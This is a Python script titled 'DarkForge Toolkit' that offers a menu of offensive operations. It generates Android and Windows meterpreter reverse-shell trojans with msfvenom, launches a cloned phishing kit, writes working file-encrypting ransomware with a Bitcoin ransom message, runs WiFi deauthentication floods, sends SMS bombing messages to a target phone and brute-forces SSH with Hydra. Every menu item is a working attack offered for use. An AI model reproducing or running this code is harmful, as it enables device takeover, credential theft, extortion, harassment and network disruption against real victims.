#!/usr/bin/env python3
# DarkForge Toolkit v1.0 (Root@OSINT:~#)
import os
import sys
import time
import socket
import random
import readline
from threading import Thread

# ANSI коды для цветов и стилей
class Color:
    GREEN = '\033[38;5;46m'
    DARK_GREEN = '\033[38;5;28m'
    CYAN = '\033[36m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Глобальные настройки
ANIMATION_SPEED = 0.02
SCAN_LINES = 50

def clear_screen():
    """Очистка экрана"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_gradient(text):
    """Вывод текста с градиентом"""
    colors = [
        '\033[38;5;28m',  # Dark green
        '\033[38;5;34m',  # Medium green
        '\033[38;5;40m',  # Bright green
        '\033[38;5;46m',  # Neon green
        '\033[38;5;82m'   # Light green
    ]
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"{color}{char}"
    return result + Color.RESET

def animate_text(text, delay=ANIMATION_SPEED):
    """Анимация печатающегося текста"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def matrix_animation():
    """Анимация падающих символов Matrix"""
    symbols = "01010101█▓▒░█▓▒░▒░█▓▒░"
    width = os.get_terminal_size().columns
    
    for _ in range(SCAN_LINES):
        line = ''.join(random.choice(symbols) for _ in range(width))
        print(Color.DARK_GREEN + line + Color.RESET)
        time.sleep(0.05)

def print_header():
    """Анимированный заголовок"""
    clear_screen()
    
    # Анимация Matrix
    matrix_animation()
    clear_screen()
    
    # Главный заголовок с градиентом
    header = r"""
     ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝ ██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║███████║██████╔╝█████╔╝ █████╗  ██║  ███╗██████╔╝██║   ██║█████╗  
    ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  
    ██████╔╝██║  ██║██║  ██║██║  ██╗███████╗╚██████╔╝██║  ██║╚██████╔╝███████╗
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
    """
    print(print_gradient(header))
    
    # Анимированный подзаголовок
    subtitle = "    Advanced Cyber Operations Framework"
    print(Color.DARK_GREEN + "    " + "─" * len(subtitle) + Color.RESET)
    animate_text(Color.YELLOW + subtitle + Color.RESET, 0.03)
    
    # Информация о системе
    sys_info = f"    Platform: {sys.platform} | User: root@osint"
    print(Color.PURPLE + sys_info + Color.RESET)
    print(Color.DARK_GREEN + "    " + "─" * len(sys_info) + "\n" + Color.RESET)

def text_menu(title, choices):
    """Стилизованное текстовое меню"""
    print(Color.BOLD + Color.CYAN + title + Color.RESET)
    print(Color.DARK_GREEN + "    " + "─" * len(title) + Color.RESET)
    
    for i, item in enumerate(choices, 1):
        print(f"{Color.GREEN}{i}.{Color.RESET} {item['name']}")
    
    print(f"{Color.GREEN}{len(choices)+1}.{Color.RESET} Exit")
    
    while True:
        try:
            choice = input(f"\n{Color.YELLOW}>>> Select operation [{Color.RESET}1-{len(choices)+1}{Color.YELLOW}]:{Color.RESET} ")
            if choice.lower() == 'exit':
                return "exit"
                
            choice = int(choice)
            if 1 <= choice <= len(choices):
                return choices[choice-1]['value']
            elif choice == len(choices)+1:
                return "exit"
                
            print(f"{Color.RED}Error: Invalid selection{Color.RESET}")
        except ValueError:
            print(f"{Color.RED}Error: Enter a number{Color.RESET}")

def kali_menu():
    """Меню для Kali Linux"""
    return {
        "title": "KALI OPERATIONS MENU",
        "choices": [
            {"name": "Create Android Trojan", "value": "android"},
            {"name": "Create Windows RAT", "value": "windows"},
            {"name": "Phishing Attack", "value": "phishing"},
            {"name": "Crypto Ransomware", "value": "ransomware"},
            {"name": "WiFi Deauth Attack", "value": "wifi"},
            {"name": "Bruteforce SSH", "value": "ssh"},
            {"name": "System Recon", "value": "sysinfo"}
        ]
    }

def termux_menu():
    """Меню для Termux"""
    return {
        "title": "TERMUX MOBILE OPERATIONS",
        "choices": [
            {"name": "WiFi Deauth Attack", "value": "wifi"},
            {"name": "SMS Bomber", "value": "sms"},
            {"name": "Bruteforce SSH", "value": "ssh"},
            {"name": "System Recon", "value": "sysinfo"}
        ]
    }

def get_local_ip():
    """Получение локального IP с анимацией"""
    try:
        animate_text(f"{Color.BLUE}Scanning network interfaces...{Color.RESET}")
        time.sleep(0.5)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        
        animate_text(f"{Color.GREEN}Local IP detected: {Color.BOLD}{ip}{Color.RESET}")
        return ip
    except:
        print(f"{Color.RED}Network scan failed! Using fallback IP{Color.RESET}")
        return "127.0.0.1"

def animate_operation(name):
    """Анимация выполняемой операции"""
    print(f"\n{Color.PURPLE}Initializing {name} sequence...{Color.RESET}")
    for _ in range(3):
        print(f"{Color.DARK_GREEN}▌{Color.RESET}", end='', flush=True)
        time.sleep(0.2)
    print()

def create_android_payload():
    """Создание Android трояна с анимацией"""
    animate_operation("ANDROID PAYLOAD")
    lhost = get_local_ip()
    lport = input(f"{Color.YELLOW}Enter LPORT [{Color.RESET}4444{Color.YELLOW}]:{Color.RESET} ") or "4444"
    
    animate_text(f"{Color.CYAN}Generating payload with msfvenom...{Color.RESET}")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o trojan.apk")
    
    print(f"\n{Color.GREEN}Payload successfully created: {Color.BOLD}trojan.apk{Color.RESET}")
    print(f"{Color.YELLOW}Handler command:{Color.RESET}")
    print(f"msfconsole -q -x 'use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'")
    input(f"\n{Color.DARK_GREEN}Press ENTER to return to main menu...{Color.RESET}")

def create_windows_rat():
    """Создание Windows RAT с анимацией"""
    animate_operation("WINDOWS RAT")
    lhost = get_local_ip()
    lport = input(f"{Color.YELLOW}Enter LPORT [{Color.RESET}4444{Color.YELLOW}]:{Color.RESET} ") or "4444"
    
    animate_text(f"{Color.CYAN}Compiling Windows executable...{Color.RESET}")
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o rat.exe")
    
    print(f"\n{Color.GREEN}RAT successfully created: {Color.BOLD}rat.exe{Color.RESET}")
    print(f"{Color.YELLOW}Handler command:{Color.RESET}")
    print(f"msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'")
    input(f"\n{Color.DARK_GREEN}Press ENTER to return to main menu...{Color.RESET}")

def create_phishing_attack():
    """Фишинговая атака с анимацией"""
    animate_operation("PHISHING KIT")
    url = input(f"{Color.YELLOW}Enter target URL to clone:{Color.RESET} ")
    
    animate_text(f"{Color.CYAN}Cloning phishing toolkit from GitHub...{Color.RESET}")
    os.system("git clone https://github.com/htr-tech/zphisher.git 2>/dev/null || echo 'Repository already exists'")
    os.chdir("zphisher")
    os.system("chmod +x zphisher.sh")
    
    animate_text(f"{Color.CYAN}Launching phishing server for {url}...{Color.RESET}")
    os.system(f"./zphisher.sh -u '{url}'")
    
    print(f"\n{Color.GREEN}Phishing server is active! Send target to:{Color.RESET}")
    print(f"{Color.BOLD}http://{get_local_ip()}{Color.RESET}")
    input(f"\n{Color.DARK_GREEN}Press ENTER to return to main menu...{Color.RESET}")
    os.chdir("..")

def create_ransomware():
    """Создание шифровальщика с анимацией"""
    animate_operation("CRYPTOLOCKER")
    path = input(f"{Color.YELLOW}Target directory [{Color.RESET}/tmp/test{Color.YELLOW}]:{Color.RESET} ") or "/tmp/test"
    key = input(f"{Color.YELLOW}Encryption key [{Color.RESET}DarkForgeRansomKey{Color.YELLOW}]:{Color.RESET} ") or "DarkForgeRansomKey"
    
    animate_text(f"{Color.CYAN}Generating AES-256 encryption algorithm...{Color.RESET}")
    os.system(f"mkdir -p {path}")
    os.system(f"echo 'Critical system file - DO NOT DELETE' > {path}/TARGET_FILE.txt")
    
    ransomware_code = f'''#!/usr/bin/env python3
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        data = f.read()
    cipher = AES.new(key.encode(), AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    with open(filepath + ".LOCKED", 'w') as f:
        f.write(iv + ct)
    os.remove(filepath)

key = "{key}"
print("\\n[!] DARKFORGE CRYPTOLOCKER ACTIVATED [!]")
print(f"Encrypting: {{path}} with key: {{key}}")
for root, dirs, files in os.walk("{path}"):
    for file in files:
        if not file.endswith(".LOCKED"):
            encrypt_file(os.path.join(root, file), key)
print("\\n[+] All files encrypted. Send 0.5 BTC to unlock")
'''
    with open("darkforge_ransomware.py", "w") as f:
        f.write(ransomware_code)
    
    print(f"\n{Color.GREEN}Ransomware created: {Color.BOLD}darkforge_ransomware.py{Color.RESET}")
    print(f"{Color.YELLOW}Test command:{Color.RESET} python3 darkforge_ransomware.py")
    input(f"\n{Color.DARK_GREEN}Press ENTER to return to main menu...{Color.RESET}")

def wifi_deauth_attack():
    """WiFi деаутентификационная атака с анимацией"""
    animate_operation("WIFI DOMINANCE")
    print(f"{Color.CYAN}Activating monitor mode...{Color.RESET}")
    os.system("sudo airmon-ng start wlan0")
    
    print(f"\n{Color.YELLOW}Scanning for targets...{Color.RESET}")
    os.system("sudo airodump-ng wlan0mon")
    
    bssid = input(f"\n{Color.YELLOW}Enter target BSSID:{Color.RESET} ")
    channel = input(f"{Color.YELLOW}Enter channel:{Color.RESET} ")
    
    print(f"\n{Color.CYAN}Locking on target: {Color.BOLD}{bssid}{Color.RESET}")
    os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} wlan0mon")
    
    input(f"\n{Color.RED}Press ENTER to launch DEAUTH attack (Ctrl+C to stop){Color.RESET}")
    print(f"{Color.RED}Flooding target with deauthentication packets...{Color.RESET}")
    os.system(f"sudo aireplay-ng -0 0 -a {bssid} wlan0mon")

def sms_bomber():
    """SMS бомбер с анимацией"""
    animate_operation("SMS BARRAGE")
    phone = input(f"{Color.YELLOW}Target phone number (+1234567890):{Color.RESET} ")
    count = input(f"{Color.YELLOW}Number of messages [{Color.RESET}100{Color.YELLOW}]:{Color.RESET} ") or "100"
    message = input(f"{Color.YELLOW}Message text [{Color.RESET}DARKFORGE SMS DOMINATION{Color.YELLOW}]:{Color.RESET} ") or "DARKFORGE SMS DOMINATION"
    
    animate_text(f"{Color.RED}Launching SMS barrage on {phone}...{Color.RESET}")
    for i in range(1, int(count)+1):
        print(f"{Color.PURPLE}Sending message {i}/{count}...{Color.RESET}")
        os.system(f"termux-sms-send -n 1 -s '{message}' {phone}")
        time.sleep(0.1)
    
    print(f"\n{Color.GREEN}Operation completed! {count} messages sent.{Color.RESET}")
    input(f"\n{Color.DARK_GREEN}Press ENTER to return to main menu...{Color.RESET}")

def bruteforce_ssh():
    """SSH брутфорс с анимацией"""
    animate_operation("SSH BRUTEFORCE")
    target = input(f"{Color.YELLOW}Target IP address:{Color.RESET} ")
    user = input(f"{Color.YELLOW}Username:{Color.RESET} ")
    wordlist = input(f"{Color.YELLOW}Wordlist path [{Color.RESET}/usr/share/wordlists/rockyou.txt{Color.YELLOW}]:{Color.RESET} ") or "/usr/share/wordlists/rockyou.txt"
    
    animate_text(f"{Color.RED}Initializing Hydra attack on {target}...{Color.RESET}")
    print(f"{Color.CYAN}Attack command:{Color.RESET} hydra -l {user} -P {wordlist} ssh://{target}")
    os.system(f"hydra -l {user} -P {wordlist} ssh://{target}")
    
    input(f"\n{Color.DARK_GREEN}Press ENTER to return to main menu...{Color.RESET}")

def system_info():
    """Информация о системе с анимацией"""
    animate_operation("SYSTEM RECON")
    print(f"{Color.BLUE}Platform:{Color.RESET} {sys.platform}")
    print(f"{Color.BLUE}Python version:{Color.RESET} {sys.version.split()[0]}")
    print(f"{Color.BLUE}IP Address:{Color.RESET} {get_local_ip()}")
    
    print(f"\n{Color.YELLOW}Core tools status:{Color.RESET}")
    tools = {
        'msfvenom': 'Metasploit Payload Generator',
        'airmon-ng': 'WiFi Monitoring',
        'hydra': 'Bruteforce Toolkit',
        'git': 'Repository Management'
    }
    
    for tool, desc in tools.items():
        status = f"{Color.GREEN}✔ OPERATIONAL{Color.RESET}" if os.system(f"which {tool} >/dev/null") == 0 else f"{Color.RED}✗ OFFLINE{Color.RESET}"
        print(f"{Color.CYAN}{tool}:{Color.RESET} {desc} - {status}")
    
    input(f"\n{Color.DARK_GREEN}Press ENTER to return to main menu...{Color.RESET}")

def run():
    """Основной цикл программы"""
    while True:
        print_header()
        
        # Определение платформы
        if "kali" in sys.platform or "linux" in sys.platform:
            menu = kali_menu()
        elif "termux" in os.environ:
            menu = termux_menu()
        else:
            print(f"{Color.RED}Unsupported platform!{Color.RESET}")
            return
        
        action = text_menu(menu["title"], menu["choices"])
        
        if action == "exit":
            animate_text(f"{Color.PURPLE}Terminating DarkForge session...{Color.RESET}")
            time.sleep(0.5)
            print(f"{Color.GREEN}Session encrypted and cleared. Until next time.{Color.RESET}")
            break
        elif action == "android":
            create_android_payload()
        elif action == "windows":
            create_windows_rat()
        elif action == "phishing":
            create_phishing_attack()
        elif action == "ransomware":
            create_ransomware()
        elif action == "wifi":
            wifi_deauth_attack()
        elif action == "sms":
            sms_bomber()
        elif action == "ssh":
            bruteforce_ssh()
        elif action == "sysinfo":
            system_info()

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}Operation aborted by user. Self-destruct sequence initiated.{Color.RESET}")
        sys.exit(1)
